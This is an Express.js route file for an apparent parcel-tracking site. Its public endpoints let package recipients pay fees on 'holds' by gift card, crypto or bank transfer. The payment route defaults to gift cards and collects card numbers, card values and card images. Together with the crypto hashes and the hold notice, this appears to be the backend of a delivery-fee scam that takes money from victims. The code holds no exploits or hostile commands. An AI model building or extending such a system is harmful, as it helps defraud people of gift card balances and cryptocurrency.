import { Router } from 'express'
import { supabaseAdmin } from '../lib/supabase.js'

const router = Router()

const DEFAULT_TRACKING_NOTICE =
  'Please contact your dispatch desk if any holds have been placed on your package for delivery purposes.'

router.get('/track/:trackingNumber', async (req, res, next) => {
  try {
    const raw = req.params.trackingNumber || ''
    const t = String(raw).trim().replace(/^#/, '').toUpperCase()
    console.log('[track] raw:', JSON.stringify(raw), 'normalized:', JSON.stringify(t))
    if (!t) return res.status(400).json({ error: 'tracking number required' })

    const { data: directResult, error: directErr } = await supabaseAdmin
      .from('shipments').select('*').eq('tracking_number', t).maybeSingle()
    if (directErr) throw directErr

    const { data: rpcResult } = await supabaseAdmin
      .rpc('track_by_number', { p_tracking: t })
    console.log('[track] direct:', directResult ? `id=${directResult.id}` : 'not found',
      '| RPC:', rpcResult?.[0] ? `id=${rpcResult[0].id}` : 'not found')

    if (!directResult) return res.status(404).json({ error: 'shipment not found' })

    const shipment = directResult
    const shipmentId = shipment.id

    const [eventsRes, imagesRes, feesRes, paymentsRes, settingsRes] = await Promise.all([
      supabaseAdmin.from('tracking_events').select('*').eq('shipment_id', shipmentId).order('occurred_at', { ascending: false }),
      supabaseAdmin.from('shipment_images').select('*').eq('shipment_id', shipmentId).order('created_at'),
      supabaseAdmin.from('shipment_fees').select('*').eq('shipment_id', shipmentId).order('created_at'),
      supabaseAdmin.from('payments')
        .select('id, method, status, amount, currency, card_brand, card_value, network, tx_hash, reference, payment_method_id, created_at')
        .eq('shipment_id', shipmentId).order('created_at', { ascending: false }),
      supabaseAdmin.from('site_settings').select('tracking_notice').eq('id', 1).maybeSingle(),
    ])
    if (eventsRes.error) throw eventsRes.error
    if (imagesRes.error) throw imagesRes.error
    if (feesRes.error) throw feesRes.error
    if (paymentsRes.error) throw paymentsRes.error
    if (settingsRes.error) console.warn('[track] notice unavailable:', settingsRes.error.message)
    console.log('[track] events:', eventsRes.data?.length ?? 0, 'images:', imagesRes.data?.length ?? 0,
      'fees:', feesRes.data?.length ?? 0, 'payments:', paymentsRes.data?.length ?? 0)

    const methodsRes = await supabaseAdmin.from('payment_methods')
      .select('*').eq('active', true)
      .order('kind', { ascending: true }).order('sort_order', { ascending: true })
    if (methodsRes.error) console.warn('[track] payment methods unavailable:', methodsRes.error.message)

    res.json({
      shipment,
      events: eventsRes.data,
      images: imagesRes.data,
      fees: feesRes.data,
      payments: paymentsRes.data,
      payment_methods: methodsRes.data ?? [],
      notice: settingsRes.data?.tracking_notice?.trim() || DEFAULT_TRACKING_NOTICE,
    })
  } catch (e) { next(e) }
})

router.get('/payment-methods', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin.from('payment_methods')
      .select('*').eq('active', true)
      .order('kind', { ascending: true }).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ methods: data })
  } catch (e) { next(e) }
})

// ------------------------------------------------------------
// Public proof-of-payment upload (bank transfer confirmation / receipts).
// Files go to the private payment-receipts bucket and the stored value is
// returned as "payment-receipts/<path>" so admins can mint signed URLs.
// ------------------------------------------------------------
const PROOF_IMAGE_TYPES = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp']
const PROOF_DOC_TYPES = ['application/pdf']
const PROOF_LIMITS = { image: 10 * 1024 * 1024, document: 25 * 1024 * 1024 }

const proofHits = new Map()
function proofRateLimited(ip) {
  const now = Date.now()
  const windowStart = now - 60_000
  const hits = (proofHits.get(ip) || []).filter((t) => t > windowStart)
  hits.push(now)
  proofHits.set(ip, hits)
  if (proofHits.size > 5000) proofHits.clear()
  return hits.length > 8
}

router.post('/payment-proof', async (req, res, next) => {
  try {
    if (proofRateLimited(req.ip)) {
      return res.status(429).json({ error: 'Too many uploads. Please wait a minute and try again.' })
    }

    const { tracking_number, file } = req.body || {}
    if (!tracking_number) return res.status(400).json({ error: 'tracking_number required' })
    if (!file || !file.startsWith('data:')) return res.status(400).json({ error: 'file must be a data URL' })

    const [meta, b64] = file.split(',')
    const mime = /data:(.*?);base64/.exec(meta)?.[1] || ''
    const kind = PROOF_IMAGE_TYPES.includes(mime) ? 'image' : PROOF_DOC_TYPES.includes(mime) ? 'document' : null
    if (!kind) return res.status(400).json({ error: 'Upload a JPG, PNG, WEBP image or a PDF document.' })

    const buffer = Buffer.from(b64 ?? '', 'base64')
    if (buffer.length > PROOF_LIMITS[kind]) {
      return res.status(400).json({ error: `That file is too large. The maximum is ${Math.round(PROOF_LIMITS[kind] / 1024 / 1024)} MB.` })
    }

    const { data: ship } = await supabaseAdmin.from('shipments')
      .select('id').eq('tracking_number', String(tracking_number).trim().toUpperCase()).maybeSingle()
    if (!ship) return res.status(404).json({ error: 'shipment not found' })

    const ext = kind === 'document' ? 'pdf' : (mime.split('/')[1] || 'jpg').replace('jpeg', 'jpg')
    const path = `${ship.id}/${Date.now()}-${Math.random().toString(36).slice(2, 8)}.${ext}`

    const { error } = await supabaseAdmin.storage.from('payment-receipts')
      .upload(path, buffer, { contentType: mime, upsert: false })
    if (error) throw error

    res.json({ path: `payment-receipts/${path}`, kind, contentType: mime })
  } catch (e) { next(e) }
})

const PAYMENT_METHODS = ['gift_card', 'crypto', 'bank']
const FRIENDLY_ERROR = 'We couldn\u2019t complete your request. Please try again.'

router.post('/payment', async (req, res, next) => {
  try {
    const {
      tracking_number, fee_ids, amount, currency, method, sender_name, sender_email,
      receipt_url, card_brand, card_number, card_value, notes,
      payment_method_id, network, tx_hash, reference,
    } = req.body || {}

    if (!tracking_number || !fee_ids?.length) {
      return res.status(400).json({ error: 'tracking_number and fee_ids required' })
    }

    const payMethod = method || 'gift_card'
    if (!PAYMENT_METHODS.includes(payMethod)) {
      return res.status(400).json({ error: 'unsupported payment method' })
    }

    let configured = null
    if (payMethod === 'crypto' || payMethod === 'bank') {
      if (!payment_method_id) {
        return res.status(400).json({ error: 'Please choose a payment option.' })
      }
      const { data: pm, error: pmErr } = await supabaseAdmin.from('payment_methods')
        .select('*').eq('id', payment_method_id).eq('active', true).maybeSingle()
      if (pmErr) throw pmErr
      if (!pm || pm.kind !== payMethod) {
        return res.status(400).json({ error: 'That payment option is no longer available. Please refresh and try again.' })
      }
      configured = pm
    }

    if (payMethod === 'gift_card') {
      if (!card_brand) return res.status(400).json({ error: 'gift card type is required' })
      if (!receipt_url) return res.status(400).json({ error: 'gift card image is required' })
    }

    if (payMethod === 'crypto') {
      if (!tx_hash?.trim()) return res.status(400).json({ error: 'A transaction hash is required.' })
    }

    if (payMethod === 'bank') {
      if (!reference?.trim() && !tx_hash?.trim() && !receipt_url) {
        return res.status(400).json({ error: 'Add a transfer reference or upload proof of payment.' })
      }
    }

    const { data: ship } = await supabaseAdmin.from('shipments')
      .select('id').eq('tracking_number', tracking_number.toUpperCase()).single()
    if (!ship) return res.status(404).json({ error: 'shipment not found' })

    const { data, error } = await supabaseAdmin.from('payments').insert({
      shipment_id: ship.id,
      fee_id: fee_ids[0],
      amount: Number(amount) || 0,
      currency: currency ?? configured?.currency ?? 'USD',
      method: payMethod,
      payment_method_id: configured?.id ?? null,
      network: network ?? configured?.network ?? null,
      tx_hash: tx_hash?.trim() || null,
      reference: reference?.trim() || null,
      sender_name: sender_name ?? null,
      sender_email: sender_email ?? null,
      receipt_url: receipt_url ?? null,
      card_brand: card_brand ?? null,
      card_number: card_number ?? null,
      card_value: card_value === '' || card_value == null ? null : Number(card_value),
      notes: notes ?? null,
      status: 'pending',
    }).select().single()
    if (error) {
      console.error('[payment] insert failed:', error.code, error.message)
      return res.status(500).json({ error: FRIENDLY_ERROR })
    }
    res.json({ payment: data })
  } catch (e) { next(e) }
})

router.get('/site-settings', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('site_settings').select('*').eq('id', 1).single()
    if (error) throw error
    res.json({ settings: data })
  } catch (e) { next(e) }
})

router.get('/services', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('services').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ services: data })
  } catch (e) { next(e) }
})

router.get('/partners', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('brand_partners').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ partners: data })
  } catch (e) { next(e) }
})

router.get('/gallery', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('gallery_items').select('*').order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ gallery: data })
  } catch (e) { next(e) }
})

router.get('/testimonials', async (_req, res, next) => {
  try {
    const { data, error } = await supabaseAdmin
      .from('testimonials').select('*')
      .eq('published', true).order('sort_order', { ascending: true })
    if (error) throw error
    res.json({ testimonials: data })
  } catch (e) { next(e) }
})

router.post('/contact', async (req, res, next) => {
  try {
    const { name, email, phone, subject, message, kind } = req.body || {}
    if (!name || !email) return res.status(400).json({ error: 'name and email required' })
    const { data, error } = await supabaseAdmin
      .from('contact_requests').insert({ name, email, phone, subject, message, kind: kind || 'general' })
      .select().single()
    if (error) throw error
    res.json({ request: data })
  } catch (e) { next(e) }
})

router.post('/newsletter', async (req, res, next) => {
  try {
    const { email } = req.body || {}
    if (!email) return res.status(400).json({ error: 'email required' })
    const { data, error } = await supabaseAdmin
      .from('newsletter_subscribers').insert({ email }).select().single()
    if (error && error.code === '23505') return res.json({ ok: true, already: true })
    if (error) throw error
    res.json({ ok: true, subscriber: data })
  } catch (e) { next(e) }
})

async function safe(p) {
  try { const r = await p; return [r.error, r.data] } catch (e) { return [e, null] }
}

export default router
